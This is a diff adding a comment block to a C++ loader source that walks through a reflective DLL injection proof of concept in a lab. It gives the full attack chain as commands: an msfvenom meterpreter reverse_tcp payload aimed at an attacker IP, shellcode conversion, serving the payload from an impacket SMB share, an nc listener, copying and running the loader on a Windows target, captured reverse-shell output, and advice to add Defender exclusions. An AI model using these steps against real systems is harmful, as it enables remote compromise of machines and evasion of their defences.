@@ -1,4 +1,149 @@
 //lsecqt
+/*
+ * =============================================================
+ *  REFLECTIVE DLL INJECTION POC — FULL WORKFLOW
+ * =============================================================
+ *
+ *  SETUP (Once)
+ *  ------------
+ *  1. Attacker: Kali Linux (IP: 192.168.68.110)
+ *  2. Target:   Windows 10/11 x64 VM (same network / bridged adapter)
+ *  3. Ensure both machines can ping each other.
+ *
+ *  STEP 1 — GENERATE THE PAYLOAD SHELLCODE (Kali)
+ *  -----------------------------------------------
+ *  Use msfvenom to create a raw shellcode payload.
+ *  This produces a raw binary (.bin) that can be loaded directly.
+ *
+ *    msfvenom -p windows/x64/meterpreter/reverse_tcp \
+ *             LHOST=192.168.68.110 \
+ *             LPORT=4444 \
+ *             -f raw -o payload.bin
+ *
+ *  NOTE: msfvenom can also output directly to a DLL or EXE format:
+ *    -f dll  → creates a Windows DLL payload
+ *    -f exe  → creates a Windows EXE payload
+ *  For THIS PoC we use -f raw to get raw shellcode bytes.
+ *
+ *  STEP 2 — CONVERT SHELLCODE TO C ARRAY (Optional)
+ *  -------------------------------------------------
+ *  If embedding the payload into the loader source:
+ *    xxd -i payload.bin > payload_array.h
+ *
+ *  Or use ShadowBurn (PE-to-shellcode converter):
+ *    python3 ~/source/ShadowBurn/ShadowBurn.py \
+ *        -f shell.bin \
+ *        -o test.dll \
+ *        -dllFunc MyDllMain
+ *
+ *    ShadowBurn converts a PE file (DLL/EXE) into a position-
+ *    independent shellcode blob.
+ *
+ *    Options:
+ *      -f          Output file for shellcode (.bin)
+ *      -o          Input PE file (.dll or .exe)
+ *      -dllFunc    Exported function to execute (e.g., MyDllMain)
+ *      --arch      Target architecture (x64 | x86)
+ *      --service   Create a service binary
+ *      -o          Output shellcode file
+ *
+ *  STEP 3 — HOST PAYLOAD VIA IMPACKET SMB SERVER (Kali)
+ *  ----------------------------------------------------
+ *  Install impacket if not present:
+ *    pip install impacket
+ *
+ *  Start an SMB share to host the payload:
+ *    impacket-smbserver share . -smb2support
+ *
+ *    Options:
+ *      share           Share name (accessed as \\IP\share)
+ *      .               Directory to serve (current dir)
+ *      -smb2support    Enable SMB2/3 (required for modern Windows)
+ *      -username       Require authentication
+ *      -password       Password for auth
+ *
+ *  The share will be accessible at:
+ *    \\192.168.68.110\share\
+ *
+ *  STEP 4 — START NETCAT LISTENER (Kali)
+ *  -------------------------------------
+ *  Wait for the reverse shell connection:
+ *    nc -lvnp 4444
+ *
+ *    -l  Listen mode
+ *    -v  Verbose
+ *    -n  No DNS resolution
+ *    -p  Port number
+ *
+ *  STEP 5 — DELIVER PAYLOAD TO TARGET (Windows)
+ *  ---------------------------------------------
+ *  On the Windows target, copy the payload from the SMB share:
+ *
+ *    copy \\192.168.68.110\share\payload.bin C:\Temp\payload.bin
+ *
+ *  Or map the share first:
+ *    net use \\192.168.68.110\share /USER:user password
+ *    copy \\192.168.68.110\share\payload.bin C:\Temp\payload.bin
+ *
+ *  STEP 6 — EXECUTE REFLECTIVE LOADER (Windows)
+ *  ---------------------------------------------
+ *  Run the reflective loader (refdll.exe) which will:
+ *    1. Read payload.bin from disk (or C:\Temp\test.dll)
+ *    2. Map it into memory (parse PE, copy sections, relocations)
+ *    3. Resolve imports
+ *    4. Execute the entry point / exported function
+ *
+ *    C:\Temp\refdll.exe
+ *
+ *  STEP 7 — CATCH THE REVERSE SHELL (Kali)
+ *  ---------------------------------------
+ *  The netcat listener on Kali should receive a connection:
+ *
+ *    listening on [any] 4444 ...
+ *    connect to [192.168.68.110] from (UNKNOWN) [192.168.68.103] 49978
+ *    Microsoft Windows [Version 10.0.19045.5854]
+ *    (c) Microsoft Corporation. All rights reserved.
+ *
+ *    C:\Users\user\Desktop>
+ *
+ *  =============================================================
+ *  QUICK REFERENCE — ALL COMMANDS
+ *  =============================================================
+ *
+ *  [KALI]
+ *  # Generate raw shellcode
+ *  msfvenom -p windows/x64/meterpreter/reverse_tcp \
+ *           LHOST=192.168.68.110 LPORT=4444 \
+ *           -f raw -o payload.bin
+ *
+ *  # Convert PE to shellcode (if using ShadowBurn)
+ *  python3 ~/source/ShadowBurn/ShadowBurn.py \
+ *      -f shell.bin -o test.dll -dllFunc MyDllMain
+ *
+ *  # Host via SMB
+ *  impacket-smbserver share . -smb2support
+ *
+ *  # Listen for reverse shell
+ *  nc -lvnp 4444
+ *
+ *  [WINDOWS]
+ *  # Copy payload from share
+ *  copy \\192.168.68.110\share\payload.bin C:\Temp\
+ *
+ *  # Execute loader
+ *  C:\Temp\refdll.exe
+ *
+ *  =============================================================
+ *  NOTES
+ *  =============================================================
+ *  - Ensure both machines are on the same network.
+ *  - Windows Defender may flag payloads — add exclusions in lab.
+ *  - SMB (port 445) must be open on the Windows firewall.
+ *  - For lab/educational purposes only.
+ *  - The `-smb2support` flag is required for Windows 10/11.
+ *  - If SMB fails, use HTTP instead: python3 -m http.server 8000
+ */
+
 
 #include <iostream>
 #include <windows.h>
